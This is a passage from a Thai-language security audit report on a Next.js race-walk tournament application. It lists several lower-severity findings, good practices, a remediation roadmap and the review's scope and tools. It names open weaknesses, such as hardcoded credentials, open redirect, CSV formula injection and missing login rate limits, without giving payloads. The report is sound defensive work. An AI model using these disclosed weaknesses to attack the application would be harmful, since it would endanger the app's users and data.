- `proxy.ts:84-90` ใช้ `getToken` อ่าน role จาก JWT (ไม่แตะ DB) — token ที่ถูก revoke/หมดอายุตาม policy (24h) หรือ user ที่ถูก suspend อาจ **ผ่าน gate ระดับ middleware** ได้จนกว่า jwt callback จะรันใหม่ **แต่** ทุกหน้า/action บังคับสิทธิ์จริงที่ data layer (`getCurrentAdmin` อ่าน DB สด, `requirePermission`) จึงเข้าถึงข้อมูล/ทำ action ไม่ได้ — เป็นการออกแบบที่ยอมรับได้ บันทึกไว้เพื่อความตระหนัก (JWT cookie `maxAge` 30 วัน > TTL จริง 24 ชม. ก็เป็น pattern เดียวกัน — บังคับจริงที่ data layer)

### 🟡 RW-21 — CSRF บน Custom POST Routes พึ่ง SameSite=Lax
- `app/api/auth/{register,logout}`, `app/api/admin/track-view` เป็น state-changing POST ที่ไม่มี CSRF token เฉพาะ — พึ่ง cookie `SameSite=Lax` (NextAuth default) ซึ่งกัน cross-site POST ได้เป็นส่วนใหญ่ ความเสี่ยงต่ำ แต่แนะนำเพิ่ม origin check หรือใช้ Server Action (มี CSRF protection ในตัว)

### 🟡 RW-22 — Secrets at Rest ใน `.env` (`ROOT_ADMIN_PASSWORD`)
- `ROOT_ADMIN_PASSWORD` เก็บ plaintext ใน `.env` (ดู RW-02) — ใช้ครั้งเดียวตอน init ควรลบหลังใช้ หรือใช้ secret manager + ตั้ง file permission เข้มงวด

### 🟡 RW-24 — Email Regex อาจเสี่ยง ReDoS (SonarQube hotspot)
- **CWE-1333** Inefficient Regular Expression Complexity · `lib/validation.ts:10`
- SonarQube flag regex `^[^\s@]+@[^\s@]+\.[^\s@]+$` ว่าอาจ backtracking แบบ super-linear — วิเคราะห์แล้วเป็น **linear backtracking ไม่ใช่ exponential** ความเสี่ยงจริงต่ำ แต่ใน `app/api/auth/register/route.ts` รัน regex **ก่อน** เช็คความยาว (EMAIL_MAX_LENGTH) ทำให้ input ยาวมากไปถึง regex ได้
- **แก้:** cap ความยาว input ก่อนรัน regex ทุกเส้นทาง และพิจารณา pattern ที่ไม่มี ambiguity (เช่นจำกัด `[^\s@.]` ในส่วน local/domain)

---

## 7. สิ่งที่ทำได้ดี (Positive Findings)

- ✅ **ไม่มี SQL Injection** — ใช้ Prisma query builder ทั้งหมด ไม่มี `$queryRaw`/`$executeRaw`/raw SQL
- ✅ **ไม่มี XSS sink** — ไม่มี `dangerouslySetInnerHTML`/`eval`/`new Function` (grep ทั่วโปรเจกต์ = 0); React escape ค่าที่แสดงผลให้อัตโนมัติ → stored data (ชื่อ, reason) ปลอดภัยตอน render
- ✅ **Authorization ครบและสม่ำเสมอ** — ทุก Server Action เริ่มด้วย `requirePermission(...)` หรือ `requireOfficialSession(...)`; `getCurrentAdmin` อ่านสิทธิ์สดจาก DB ทุกครั้ง (ไม่พึ่ง stale JWT)
- ✅ **IDOR protection ดี** — official action ผูกกับ `roundId`/`eventId` ใน signed cookie (ไม่เชื่อ route param); head-judge ยืนยันใบแดงต้อง `card.roundId === session.roundId`
- ✅ **Session management** — `UserSession` + revoke (`revokedAt` เช็คใน jwt callback) + user status lifecycle (ACTIVE/SUSPENDED/DELETED) + finalizeDeletion เป็น transaction
- ✅ **Cookie security** — `httpOnly` + `secure` (prod) + `sameSite=lax` ทั้ง admin และ official cookie
- ✅ **Password hashing** — bcrypt; ไม่เคย log รหัสผ่าน/secret
- ✅ **NEXTAUTH_SECRET แข็งแรง** (random 256-bit)
- ✅ **`.env` จัดการถูก** — gitignore ครอบ `.env*`, ไม่มีใน git history
- ✅ **Audit logging รอบด้าน** — `ActivityLog` + `RoundActivityLog`; `createActivityLog` กลืน error เพื่อไม่ให้ล้ม request; identity เอาจาก session ไม่ใช่ body (`track-view`)
- ✅ **bulk import ยังไม่ implement** — ไม่มี surface ของการ parse ไฟล์อัปโหลด (ตรวจแล้ว: เป็นเพียง constant สำรอง)

---

## 8. แผนการแก้ไขเรียงตามลำดับความสำคัญ (Remediation Roadmap)

**รีบทันที (วันนี้–สัปดาห์นี้):**
1. RW-01 — ลบ hardcoded credential ออกจาก client bundle + ตรวจ/ลบบัญชี seed ใน prod
2. RW-02 — หมุน credential DB + `ROOT_ADMIN_PASSWORD`, ปิด public exposure ของ MySQL, แยก credential dev/prod
3. RW-03 — เพิ่ม rate-limit/lockout ที่ admin login

**ระยะสั้น (1–2 สัปดาห์):**
4. RW-10 — `npm audit fix` + อัปเดต `next`/`next-auth`
5. RW-04 — แก้ CSV formula injection
6. RW-05 — แก้ open redirect (backslash)
7. RW-06 — เพิ่ม security headers
8. RW-07 — ใส่ permission check ที่ register API (หรือลบ endpoint)
9. RW-08 — แก้การไว้ใจ XFF + shared rate-limiter
10. RW-23 — สร้าง secret code ด้วย CSPRNG ฝั่ง server (แทน `Math.random()` ฝั่ง client)

**ระยะกลาง:**
10. RW-09, RW-11, RW-12 — OAuth linking, แยกสิทธิ์ moderator, revocation ของ official session
11. RW-13 → RW-22 — hardening ตามรายละเอียด

**กระบวนการต่อเนื่อง:**
- ตั้ง `npm audit` + SAST (Semgrep/SonarQube) ใน CI
- เพิ่ม security regression tests (open redirect, authz bypass, CSV injection)

---

## 9. ภาคผนวก (Appendix)

- **ขอบเขตไฟล์ที่รีวิวเชิงลึก:** `auth.ts`, `proxy.ts`, `lib/{official-jwt,official-session,authz,permissions,admin-auth-redirect,rate-limit,request-meta,validation,user-status,activity-log,prisma}.ts`, `app/api/**`, `app/actions/**`, `prisma/{schema.prisma,seed.ts,init-root-admin.ts}`, `components/auth/admin-login-form.tsx`, `lib/report/summary-xlsx.ts`, `next.config.ts`, `.env`
- **เครื่องมือเวอร์ชัน:** Node v22.16.0, npm 11.8.0, Semgrep (community rules), SonarQube Community 26.5.0
- **ไฟล์ผลลัพธ์ดิบ:** `docs/security/semgrep-results.json` (Semgrep) · SonarQube dashboard ดูแบบ interactive ได้ที่ `http://localhost:9000` (login `admin`/`admin`, project `racewalk-tournament`) — หยุด container เมื่อเสร็จด้วย `docker rm -f rw-sonarqube`
- **ไฟล์ config สแกน:** `sonar-project.properties` (root) — เก็บไว้สำหรับ re-scan/CI
- **ข้อจำกัด:** การตรวจนี้เป็น static review + dependency/SAST scan ไม่รวม dynamic pentest (DAST), infrastructure review เชิงลึก (เครือข่าย/DB hardening จริง), หรือการตรวจ business-logic ครบทุกเส้นทาง
